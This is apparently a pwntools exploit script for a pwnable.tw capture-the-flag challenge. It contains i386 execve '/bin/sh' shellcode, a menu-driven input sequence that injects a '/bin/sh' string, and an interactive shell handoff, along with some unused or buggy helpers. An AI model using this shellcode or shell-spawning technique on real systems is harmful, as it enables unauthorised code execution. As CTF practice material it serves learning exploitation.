from pwn import *
import sys,getopt
import time


args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = './test-unupxd'
local = 1 if '-r' not in args else 0
attach = local & 1
bps = attach & 1
#socat TCP4-LISTEN:10001,fork EXEC:./pwn1
ip = 'chall.pwnable.tw'
port = 10000
io = None
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

def makeio():
    global io 
    if local:
        io = process(proc_name)
    else:
        io = remote(ip,port)
def ru(data):
    return io.recvuntil(data)
def rv():
    return io.recv()
def sl(data):
    return io.sendline(data)
def sd(data):
    return io.send(data)
def rl():
    return io.recvline()
def sa(declim,data):
    return io.sendlineafter(declim,data)

def wait():
    '''wait while debug and sleep while exploiting'''
    if wait == 1 :
        raw_input('continue send?')
    else:
        sleep(1)

def attach():
    if attach:
        attach_name = proc_name.replace('./','')
        log.info(attach_name  )
        if bps:
            gdb.attach(pidof(attach_name)[0], open('bps'))
        else:
            gdb.attach(pidof(attach_name)[0])
    
def pwn():
    makeio()
    if debug:
        context.log_level = 'debug'
    sa('username:','rot')
    sa('password','123456')
    sa('order:','1')
    sa('order:','2')
    sa('order:','1')
    sa('order:','4')
    sa('idea:','12345678901/bin/sh\x00')
    sa('order:','1')
    sa('order:','1')
    sa('order:','1')
    sa('order:','1')
    sa('name:','12341234a1')
    #attach()
    io.interactive()


if __name__ == '__main__':
	pwn()

